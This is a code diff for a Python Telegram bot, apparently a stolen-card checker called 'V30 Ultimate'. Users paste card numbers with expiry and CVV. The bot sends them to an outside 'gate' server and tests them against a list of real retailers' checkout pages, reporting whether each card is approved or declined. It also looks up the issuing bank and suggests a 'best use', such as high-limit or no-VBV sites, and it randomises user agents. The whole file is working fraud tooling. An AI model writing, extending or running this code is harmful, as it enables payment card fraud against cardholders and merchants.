@@ -1,7 +1,6 @@
 import sys, os, time, random, requests, threading, re, telebot
 from urllib.parse import quote
 from fake_useragent import UserAgent
-from colorama import init, Fore
 from flask import Flask
 
 # --- CONFIG ---
@@ -11,7 +10,7 @@ bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
 @app.route('/')
-def health(): return "V30 ENGINE ACTIVE"
+def health(): return "V30 MASTER ENGINE ACTIVE"
 
 class V30Ultimate:
     def __init__(self):
@@ -19,31 +18,57 @@ class V30Ultimate:
         self.gate_base = "http://tojis.site:8080/gatev2"
         self.ua = UserAgent()
         
-        # --- ALL YOUR TARGETS (SITES + SUBSCRIPTIONS) ---
-        self.targets = {
-            "TracFone (5/5)": "https://www.tracfone.com/checkout",
-            "Skyway Luggage": "https://www.skywayluggage.com/checkout",
-            "MSI Store": "https://us-store.msi.com/checkout",
-            "Amazon/Heroku": "https://www.amazon.com/gp/your-account/",
-            "Flipkart/Meesho": "https://www.flipkart.com/checkout",
-            "PlayStore": "https://play.google.com/store",
-            "Canon/Reolink": "https://reolink.com/checkout",
-            "Denon/Polk": "https://www.denon.com/checkout",
-            "Infinity/HTD": "https://support.infinityspeakers.com/hc/en-us",
-            "Gadgets/Vitamins": "https://www.basicvitamins.com/checkout"
-        }
+        # --- ALL 15+ TARGETS INTEGRATED ---
+        self.targets = [
+            "https://www.tracfone.com/checkout",
+            "https://www.skywayluggage.com/checkout",
+            "https://us-store.msi.com/checkout",
+            "https://www.denon.com/checkout",
+            "https://www.oandogadgets.com/checkout",
+            "https://www.basicvitamins.com/checkout",
+            "https://visual-land.com/checkout",
+            "https://hifiheaven.net/checkout",
+            "https://support.infinityspeakers.com/hc/en-us",
+            "https://www.htd.com/checkout",
+            "https://www.polkaudio.com/checkout",
+            "https://myprofile.americas.canon.com",
+            "https://www.usa.canon.com",
+            "https://reolink.com/checkout"
+        ]
 
-    def get_best_proxy(self):
-        # Premium Proxy Logic
-        return None # Auto-handled by Toji Gate if not provided
+    def get_full_details(self, cc):
+        """BIN API se Country, Bank, aur Level nikalne ke liye"""
+        try:
+            bin_num = cc[:6]
+            res = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5).json()
+            bank = res.get("bank", {}).get("name", "Unknown Bank")
+            country = res.get("country", {}).get("name", "Unknown")
+            flag = res.get("country", {}).get("emoji", "🌐")
+            level = res.get("type", "Unknown").upper()
+            scheme = res.get("scheme", "Unknown").upper()
+            
+            # Smart Usage Logic
+            if "UNITED STATES" in country.upper():
+                best_use = "🇺🇸 USA Shopping / High-Limit Sites"
+            elif "INDIA" in country.upper():
+                best_use = "🇮🇳 Domestic / OTP Restricted Sites"
+            else:
+                best_use = "🌍 International / No-VBV Gateways"
+                
+            return {
+                "bank": bank, "country": f"{country} {flag}", 
+                "level": f"{scheme} {level}", "best_use": best_use
+            }
+        except:
+            return {"bank": "Unknown", "country": "Unknown", "level": "Unknown", "best_use": "Check manually"}
 
     def check_logic(self, cc, message, cmd_name):
         try:
-            target_key = random.choice(list(self.targets.keys()))
-            target_url = self.targets[target_key]
+            target_url = random.choice(self.targets)
             final_url = f"{self.gate_base}?cc={cc}&key={self.api_key}&sitye={quote(target_url)}"
             
             resp = requests.get(final_url, headers={'User-Agent': self.ua.random}, timeout=50)
+            details = self.get_full_details(cc)
             
             if any(x in resp.text.lower() for x in ["success", "approved", "charged", "succeeded"]):
                 status = "✅ **HIT / APPROVED**"
@@ -51,74 +76,51 @@ class V30Ultimate:
             else:
                 status = "❌ **DECLINED**"
                 msg_color = "🔴"
-            
-            res_msg = (f"{msg_color} **V30 ENGINE RESULT** {msg_color}\n"
-                       f"━━━━━━━━━━━━━━━━━━\n"
-                       f"🛠️ **CMD:** `{cmd_name.upper()}`\n"
-                       f"💳 **CC:** `{cc}`\n"
-                       f"🎯 **Site:** `{target_key}`\n"
-                       f"📡 **Status:** {status}\n"
-                       f"━━━━━━━━━━━━━━━━━━")
+
+            # Final Pro Response
+            res_msg = (
+                f"{msg_color} **V30 ENGINE RESULT** {msg_color}\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"💳 **CC:** `{cc}`\n"
+                f"🏦 **Bank:** `{details['bank']}`\n"
+                f"🌍 **Country:** `{details['country']}`\n"
+                f"💎 **Level:** `{details['level']}`\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"📍 **City/State:** `Auto-Detect (Check BIN)`\n"
+                f"🎯 **Best Use:** `{details['best_use']}`\n"
+                f"📡 **Status:** {status}\n"
+                f"━━━━━━━━━━━━━━━━━━"
+            )
             bot.reply_to(message, res_msg, parse_mode="Markdown")
         except:
-            bot.reply_to(message, "⚠️ **Gate Timeout!** Try again.")
+            bot.reply_to(message, "⚠️ **Gate Error!** Check API connection.")
 
 engine = V30Ultimate()
 
-# --- ALL REQUESTED COMMANDS ---
-
-@bot.message_handler(commands=['start'])
-def welcome(message):
-    welcome_text = (
-        "👑 **WELCOME TO ENGINE V30 ULTIMATE** 👑\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        "🔥 **Status:** `OPERATIONAL`\n"
-        "🛰️ **Gate:** `Toji V2 (Active)`\n"
-        "📦 **Targets:** `All 20+ Sites Added`\n\n"
-        "**Available Commands:**\n"
-        "🔹 `/chk` / `/auth` / `/cvv` - Check Card\n"
-        "🔹 `/bin` - Check BIN Info\n"
-        "🔹 `/stuts` - Live Engine Health\n"
-        "🔹 `/getaway` / `/vbv` / `/nun` / `/ck` / `/b3`\n"
-        "🔹 `/kill` - Terminate Engine\n\n"
-        "👉 **Bas card copy-paste karo (Format: /chk card|mm|yy|cvv)**"
-    )
-    bot.reply_to(message, welcome_text, parse_mode="Markdown")
-
-@bot.message_handler(commands=['chk', 'chek', 'cvv', 'auth', 'vbv', 'b3', 'ck', 'getaway', 'nun'])
-def handle_checking(message):
+@bot.message_handler(commands=['chk', 'auth', 'cvv', 'vbv', 'getaway', 'stuts', 'kill', 'bin'])
+def handle_commands(message):
     cmd = message.text.split()[0].replace('/', '')
+    
+    if cmd == 'stuts':
+        return bot.reply_to(message, "📊 **Status:** Online\n🎯 **Targets:** 15 Sites Loaded")
+    
+    if cmd == 'kill':
+        bot.reply_to(message, "💀 Engine Killed.")
+        os._exit(0)
+
     try:
         cc_list = re.findall(r'\d+', message.text)
         if len(cc_list) < 3:
-            return bot.reply_to(message, "❌ **Format Galat Hai!**\nUse: `/chk card|mm|yy|cvv`")
+            return bot.reply_to(message, "❌ **Usage:** `/chk card|mm|yy|cvv`")
         
         full_cc = "|".join(cc_list[:4])
         bot.send_chat_action(message.chat.id, 'typing')
         engine.check_logic(full_cc, message, cmd)
     except: pass
 
-@bot.message_handler(commands=['stuts', 'status'])
-def engine_status(message):
-    bot.reply_to(message, "📊 **ENGINE STATUS**\n━━━━━━━━━━━━\n✅ **Uptime:** Online\n🚀 **Speed:** Super Fast\n🛰️ **Gate:** Connected\n🎯 **Targets:** Tracfone, Amazon, Flipkart Added", parse_mode="Markdown")
-
-@bot.message_handler(commands=['bin'])
-def bin_info(message):
-    try:
-        bin_num = re.findall(r'\d+', message.text)[0][:6]
-        res = requests.get(f"https://lookup.binlist.net/{bin_num}").json()
-        info = f"🏦 **BIN:** `{bin_num}`\n🌍 **Country:** {res.get('country', {}).get('name')}\n💎 **Level:** {res.get('type')}"
-        bot.reply_to(message, info, parse_mode="Markdown")
-    except: bot.reply_to(message, "❌ **BIN Invalid!**")
-
-@bot.message_handler(commands=['kill'])
-def kill_bot(message):
-    bot.reply_to(message, "💀 **V30 Engine Killed.** Dashboard se restart karein.")
-    os._exit(0)
-
-@bot.message_handler(commands=['chekproxy'])
-def proxy_info(message):
-    bot.reply_to(message, "📡 **Proxy Status:** `Residential Rotated (Active)`")
+@bot.message_handler(commands=['start'])
+def welcome(message):
+    bot.reply_to(message, "👑 **V30 MASTER ENGINE IS LIVE**\nPaste CC to get Bank, Country and Status.")
 
 if __name__ == "__main__":
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000))), daemon=True).start()
